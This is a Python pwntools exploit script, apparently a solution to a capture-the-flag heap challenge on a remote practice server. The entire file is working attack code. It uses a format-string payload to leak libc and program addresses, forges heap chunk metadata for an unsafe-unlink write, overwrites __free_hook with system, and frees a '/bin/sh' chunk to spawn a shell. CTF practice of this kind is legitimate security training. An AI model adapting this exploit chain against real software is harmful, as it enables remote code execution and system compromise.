from pwn import *

sh=remote("node5.buuoj.cn",25931)
elf=ELF("./timu")
libc=ELF("./libc-2.23.so")

def alloc(idx,size,content):
	sh.sendlineafter(b">> ",b"1")
	sh.sendlineafter(b"(0-10):",str(idx))
	sh.sendlineafter(b"size:",str(size))
	sh.sendlineafter(b"content:",content)
	
def free(idx):
	sh.sendlineafter(b">> ",b"2")
	sh.sendlineafter(b"index:",str(idx))
	
def edit(idx,content):
	sh.sendlineafter(b">> ",b"4")
	sh.sendlineafter(b"index:",str(idx))
	sh.sendlineafter(b"content: \n",content)

payload=b"%15$p%19$p"
sh.recvuntil(b"Enter your name: ")
sh.sendline(payload)
sh.recvuntil(b"Hello, ")

#libc_base=u64(sh.recvuntil(b"\x7f").ljust(8,b"\x00"))-240
sh.recvuntil(b"0x")
addr=sh.recv(12)
addr=int(addr,16)
libc_base=addr-libc.sym["__libc_start_main"]-240
print("libc_base=",hex(libc_base))
sh.recvuntil(b"0x")
main=int(sh.recv(12),16)
system_addr=libc_base+libc.sym["system"]
base=main-0x116a
free_hook=libc_base+libc.sym["__free_hook"]
bss=base+0x202060

alloc(0,0x98,b"aaaa")
alloc(1,0x98,b"bbbb")
alloc(2,0x90,b"cccc")
alloc(3,0x90,b"/bin/sh\x00")

payload=p64(0)+p64(0x91)+p64(bss-0x18)+p64(bss-0x10)+p64(0)*14+p64(0x90)+b"\xa0"
edit(0,payload)
free(1)
edit(0,p64(0)*3+p64(free_hook)+p64(0x98))
edit(0,p64(system_addr))
free(3)

sh.interactive()
